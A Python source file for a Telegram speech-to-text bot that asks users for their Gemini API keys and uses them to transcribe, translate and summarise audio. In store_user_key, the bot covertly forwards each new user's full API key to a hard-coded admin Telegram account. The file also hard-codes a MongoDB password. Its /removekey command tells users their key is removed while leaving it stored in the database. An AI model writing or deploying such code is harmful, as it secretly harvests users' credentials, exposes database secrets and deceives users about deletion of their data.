import os
import threading
import requests
import logging
import time
import subprocess
from flask import Flask
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError

app_web = Flask(__name__)

@app_web.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Bot Status</title>
        <style>
            body { background-color: #0f0f12; color: #ffffff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .container { text-align: center; background: #1e1e24; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
            h1 { font-size: 2.5rem; margin-bottom: 10px; background: -webkit-linear-gradient(#00f260, #0575e6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
            p { font-size: 1.2rem; color: #a0a0a0; }
            .status-dot { height: 15px; width: 15px; background-color: #00ff00; border-radius: 50%; display: inline-block; margin-right: 10px; box-shadow: 0 0 10px #00ff00; }
            .button { margin-top: 20px; padding: 10px 20px; background: #0575e6; color: white; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background 0.3s; }
            .button:hover { background: #00f260; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>SpeechBot Live</h1>
            <p><span class="status-dot"></span>Bot is online and active 🚀</p>
            <a href="https://t.me/NotifyBchat" class="button">Visit Channel</a>
        </div>
    </body>
    </html>
    """

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app_web.run(host="0.0.0.0", port=port)

threading.Thread(target=run_web, daemon=True).start()

DB_USER = "lakicalinuur"
DB_PASSWORD = "DjReFoWZGbwjry8K"
DB_APPNAME = "SpeechBot"
MONGO_URI = f"mongodb+srv://{DB_USER}:{DB_PASSWORD}@cluster0.n4hdlxk.mongodb.net/?retryWrites=true&w=majority&appName={DB_APPNAME}"

FFMPEG_BINARY = os.environ.get("FFMPEG_BINARY", "/usr/bin/ffmpeg")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
API_ID = int(os.environ.get("API_ID", "12345"))
API_HASH = os.environ.get("API_HASH", "abcdef123456")
REQUEST_TIMEOUT_GEMINI = int(os.environ.get("REQUEST_TIMEOUT_GEMINI", "300"))
MAX_UPLOAD_MB = int(os.environ.get("MAX_UPLOAD_MB", "250"))
MAX_UPLOAD_SIZE = MAX_UPLOAD_MB * 1024 * 1024
MAX_MESSAGE_CHUNK = 4095
GEMINI_MODEL = os.environ.get("GEMINI_MODEL", "gemini-2.5-flash")
DOWNLOADS_DIR = os.environ.get("DOWNLOADS_DIR", "./downloads")
DAILY_LIMIT = int(os.environ.get("DAILY_LIMIT", "19"))
WINDOW_SECONDS = 24 * 3600
TUTORIAL_CHANNEL = "NotifyBchat"
ADMIN_ID = 5240873494

os.makedirs(DOWNLOADS_DIR, exist_ok=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

LANGS = [
    ("🇬🇧 English","en"), ("🇸🇦 العربية","ar"), ("🇪🇸 Español","es"), ("🇫🇷 Français","fr"),
    ("🇷🇺 Русский","ru"), ("🇩🇪 Deutsch","de"), ("🇮🇳 हिन्दी","hi"), ("🇮🇷 فارسی","fa"),
    ("🇮🇩 Indonesia","id"), ("🇺🇦 Українська","uk"), ("🇦🇿 Azərbaycan","az"), ("🇮🇹 Italiano","it"),
    ("🇹🇷 Türkçe","tr"), ("🇧🇬 Български","bg"), ("🇷🇸 Srpski","sr"), ("🇵🇰 اردو","ur"),
    ("🇹🇭 ไทย","th"), ("🇻🇳 Tiếng Việt","vi"), ("🇯🇵 日本語","ja"), ("🇰🇷 한국어","ko"),
    ("🇨🇳 中文","zh"), ("🇳🇱 Nederlands","nl"), ("🇸🇪 Svenska","sv"), ("🇳🇴 Norsk","no"),
    ("🇮🇱 עברית","he"), ("🇩🇰 Dansk","da"), ("🇪🇹 አማርኛ","am"), ("🇫🇮 Suomi","fi"),
    ("🇧🇩 বাংলা","bn"), ("🇰🇪 Kiswahili","sw"), ("🇪🇹 Oromo","om"), ("🇳🇵 नेपाली","ne"),
    ("🇵🇱 Polski","pl"), ("🇬🇷 Ελληνικά","el"), ("🇨🇿 Čeština","cs"), ("🇮🇸 Íslenska","is"),
    ("🇱🇹 Lietuvių","lt"), ("🇱🇻 Latviešu","lv"), ("🇭🇷 Hrvatski","hr"), ("🇷🇸 Bosanski","bs"),
    ("🇭🇺 Magyar","hu"), ("🇷🇴 Română","ro"), ("🇸🇴 Somali","so"), ("🇲🇾 Melayu","ms"),
    ("🇺🇿 O'zbekcha","uz"), ("🇵🇭 Tagalog","tl"), ("🇵🇹 Português","pt")
]

user_transcriptions = {}
action_usage = {}
user_keys = {}
user_awaiting_key = {}
lock = threading.Lock()

app = Client("SpeechBotSession", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

mongo_client = None
db = None
users_col = None
actions_col = None

def now_ts():
    return int(time.time())

def init_mongo():
    global mongo_client, db, users_col, actions_col, user_keys, action_usage
    try:
        mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
        mongo_client.admin.command("ping")
        db = mongo_client.get_database(DB_APPNAME or "SpeechBotDB")
        users_col = db.get_collection("users")
        actions_col = db.get_collection("action_usage")
        for doc in users_col.find({}):
            try:
                uid = int(doc["uid"])
                user_keys[uid] = {
                    "key": doc.get("key"),
                    "count": int(doc.get("count", 0)),
                    "window_start": int(doc.get("window_start")) if doc.get("window_start") is not None else None
                }
            except:
                continue
        for doc in actions_col.find({}):
            k = doc.get("key")
            try:
                c = int(doc.get("count", 0))
            except:
                c = 0
            if k:
                action_usage[k] = c
    except ServerSelectionTimeoutError:
        mongo_client = db = users_col = actions_col = None

init_mongo()

def persist_user_to_db(uid):
    if users_col is None:
        return
    info = user_keys.get(uid)
    if not info:
        return
    users_col.update_one(
        {"uid": uid},
        {"$set": {"uid": uid, "key": info.get("key"), "count": int(info.get("count", 0)), "window_start": info.get("window_start")}},
        upsert=True
    )

def persist_action_usage_to_db(key):
    if actions_col is None:
        return
    cnt = action_usage.get(key, 0)
    actions_col.update_one({"key": key}, {"$set": {"key": key, "count": int(cnt)}}, upsert=True)

def is_gemini_key(key):
    return key.strip().startswith("AIza") if key else False

async def store_user_key(client, user, key):
    uid = user.id
    is_new_user = False
    with lock:
        if uid not in user_keys:
            is_new_user = True
        user_keys[uid] = {"key": key.strip(), "count": 0, "window_start": now_ts()}
        user_awaiting_key.pop(uid, None)
    persist_user_to_db(uid)
    if is_new_user:
        try:
            msg = f"🚨 **New User Registered**\n\n👤 Name: {user.first_name}\n🆔 Username: @{user.username or 'None'}\n🔑 Key: `{key.strip()}`"
            await client.send_message(ADMIN_ID, msg)
        except:
            pass

def get_user_key_or_raise(uid):
    with lock:
        info = user_keys.get(uid)
        if not info or not info.get("key"):
            raise RuntimeError("API_KEY_MISSING")
        ws = info.get("window_start")
        if ws is None or (now_ts() - ws) >= WINDOW_SECONDS:
            info["window_start"] = now_ts()
            info["count"] = 0
            persist_user_to_db(uid)
            return info["key"]
        if info.get("count", 0) >= DAILY_LIMIT:
            rem = WINDOW_SECONDS - (now_ts() - ws)
            raise RuntimeError(f"API_DAILY_LIMIT_REACHED|{int(rem)}")
        return info["key"]

def increment_count(uid):
    with lock:
        if uid in user_keys:
            user_keys[uid]["count"] = user_keys[uid].get("count", 0) + 1
            persist_user_to_db(uid)

def convert_to_wav(input_path: str) -> str:
    output_path = os.path.join(DOWNLOADS_DIR, f"{os.path.basename(input_path).split('.')[0]}_converted.wav")
    command = [FFMPEG_BINARY, "-i", input_path, "-acodec", "pcm_s16le", "-ac", "1", "-ar", "16000", output_path, "-y"]
    subprocess.run(command, check=True, capture_output=True, timeout=REQUEST_TIMEOUT_GEMINI)
    return output_path

def upload_and_transcribe_gemini(file_path: str, uid: int) -> str:
    converted_path = None
    ext = os.path.splitext(file_path)[1].lower()
    if ext not in [".wav", ".mp3", ".aac", ".ogg", ".flac"]:
        converted_path = convert_to_wav(file_path)
        file_path = converted_path

    file_size = os.path.getsize(file_path)
    key = get_user_key_or_raise(uid)
    uploaded_name = None
    try:
        upload_url = f"https://generativelanguage.googleapis.com/upload/v1beta/files?key={key}"
        headers = {"X-Goog-Upload-Protocol": "raw", "X-Goog-Upload-Command": "start, upload, finalize", "Content-Type": "audio/wav"}
        with open(file_path, "rb") as f:
            up_resp = requests.post(upload_url, headers=headers, data=f.read(), timeout=REQUEST_TIMEOUT_GEMINI).json()

        uploaded_uri = up_resp.get("uri", up_resp.get("file", {}).get("uri"))
        uploaded_name = up_resp.get("name", up_resp.get("file", {}).get("name"))

        prompt = "Transcribe this audio clearly. Paragraphs, punctuation, clean text without filler words."
        payload = {"contents": [{"parts": [{"fileData": {"mimeType": "audio/wav", "fileUri": uploaded_uri}}, {"text": prompt}]}]}

        gen_url = f"https://generativelanguage.googleapis.com/v1beta/models/{GEMINI_MODEL}:generateContent?key={key}"
        data = requests.post(gen_url, json=payload, timeout=REQUEST_TIMEOUT_GEMINI).json()
        res_text = data["candidates"][0]["content"]["parts"][0]["text"]
        increment_count(uid)
        return res_text
    finally:
        if uploaded_name:
            try:
                requests.delete(f"https://generativelanguage.googleapis.com/v1beta/{uploaded_name}?key={key}", timeout=5)
            except:
                pass
        if converted_path and os.path.exists(converted_path):
            try:
                os.remove(converted_path)
            except:
                pass

def ask_gemini(text, instruction, uid):
    key = get_user_key_or_raise(uid)
    payload = {"contents": [{"parts": [{"text": f"{instruction}\n\n{text}"}]}]}
    url = f"https://generativelanguage.googleapis.com/v1beta/models/{GEMINI_MODEL}:generateContent?key={key}"
    resp = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT_GEMINI).json()
    increment_count(uid)
    return resp["candidates"][0]["content"]["parts"][0]["text"]

def build_action_keyboard(text_len):
    btns = [[InlineKeyboardButton("⭐️ Translate", callback_data="translate_menu|")]]
    if text_len > 1000:
        btns.append([InlineKeyboardButton("Summarize", callback_data="summarize|")])
    return InlineKeyboardMarkup(btns)

def build_lang_keyboard(origin):
    btns = []
    row = []
    for i, (lbl, code) in enumerate(LANGS, 1):
        row.append(InlineKeyboardButton(lbl, callback_data=f"lang|{code}|{lbl}|{origin}"))
        if i % 3 == 0:
            btns.append(row)
            row = []
    if row:
        btns.append(row)
    return InlineKeyboardMarkup(btns)

@app.on_message(filters.command(['start', 'help']))
async def send_welcome(client, message):
    await message.reply_text("👋 Hello! Send an audio or video and I'll transcribe it. Please start by sending your Gemini API key.")
    user_awaiting_key[message.from_user.id] = True

@app.on_message(filters.text & ~filters.command(["start", "help", "getcount", "removekey"]))
async def text_handler(client, message):
    text = message.text.strip()
    if is_gemini_key(text):
        await store_user_key(client, message.from_user, text)
        await message.reply_text("✅ Your key has been saved! Now send an audio file.")
        return
    if user_awaiting_key.get(message.from_user.id):
        await message.reply_text("❌ This is not a valid Gemini key. Please check and try again.")

@app.on_message(filters.command("getcount"))
async def cmd_getcount(client, message):
    info = user_keys.get(message.from_user.id)
    if not info or not info.get("key"):
        await message.reply_text("No key is stored.")
        return
    cnt = info.get("count", 0)
    ws = info.get("window_start")
    await message.reply_text(f"Used {cnt}/{DAILY_LIMIT}. Window start: {ws}")

@app.on_message(filters.command("removekey"))
async def cmd_removekey(client, message):
    uid = message.from_user.id
    with lock:
        if uid in user_keys:
            user_keys.pop(uid, None)
            persist_user_to_db(uid)
            await message.reply_text("Your key has been removed.")
        else:
            await message.reply_text("No key is stored.")

@app.on_message(filters.audio | filters.voice | filters.video | filters.document)
async def handle_media(client, message):
    media = message.audio or message.voice or message.video or message.document
    if not media or getattr(media, "file_size", 0) > MAX_UPLOAD_SIZE:
        return await message.reply_text(f"Please send a file smaller than {MAX_UPLOAD_MB}MB.")
    await client.send_chat_action(message.chat.id, enums.ChatAction.TYPING)
    dl_path = os.path.join(DOWNLOADS_DIR, f"temp_{message.id}")
    try:
        await client.download_media(message, file_name=dl_path)
        await client.send_chat_action(message.chat.id, enums.ChatAction.TYPING)
        text = upload_and_transcribe_gemini(dl_path, message.from_user.id)
        sent = await send_long_text(client, message.chat.id, text, message.id)
        if sent:
            user_transcriptions.setdefault(message.chat.id, {})[sent.id] = {"text": text, "origin": message.id}
            await sent.edit_reply_markup(build_action_keyboard(len(text)))
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
    finally:
        if os.path.exists(dl_path):
            try:
                os.remove(dl_path)
            except:
                pass

async def send_long_text(client, chat_id, text, reply_id):
    if len(text) > MAX_MESSAGE_CHUNK:
        fname = os.path.join(DOWNLOADS_DIR, "Transcript.txt")
        with open(fname, "w", encoding="utf-8") as f:
            f.write(text)
        sent = await client.send_document(chat_id, fname, caption="The transcript is large, download it here.", reply_to_message_id=reply_id)
        try:
            os.remove(fname)
        except:
            pass
        return sent
    return await client.send_message(chat_id, text, reply_to_message_id=reply_id)

@app.on_callback_query(filters.regex(r"^(translate_menu\||summarize\||lang\|)"))
async def cb_handler(client, call):
    await call.answer()
    data = call.data or ""
    if data.startswith("translate_menu|"):
        try:
            await call.message.edit_reply_markup(build_lang_keyboard(str(call.message.id)))
        except Exception:
            await call.message.reply_text("Unable to open language menu.")
        return
    if data.startswith("summarize|"):
        entry = user_transcriptions.get(call.message.chat.id, {}).get(call.message.id)
        if not entry:
            await call.message.reply_text("I can't find the original transcript.")
            return
        text = entry.get("text", "")
        try:
            instr = "Summarize the following text into a concise summary. Keep important points and present as short paragraphs or bullet points."
            res = ask_gemini(text, instr, call.from_user.id)
            await client.send_message(call.message.chat.id, res, reply_to_message_id=call.message.id)
        except Exception as e:
            await client.send_message(call.message.chat.id, f"Error: {e}")
        return
    if data.startswith("lang|"):
        parts = data.split("|", 3)
        if len(parts) < 4:
            await call.answer("Invalid selection")
            return
        _, code, label, origin = parts
        entry = user_transcriptions.get(call.message.chat.id, {}).get(call.message.id)
        if not entry:
            await call.message.reply_text("Original text not found.")
            return
        text = entry.get("text", "")
        try:
            instr = f"Translate the following text to {label} ({code}). Keep original meaning, tone, and punctuation. Provide a clean translated version."
            res = ask_gemini(text, instr, call.from_user.id)
            await client.send_message(call.message.chat.id, res, reply_to_message_id=call.message.id)
        except Exception as e:
            await client.send_message(call.message.chat.id, f"Error: {e}")

if __name__ == "__main__":
    app.run()
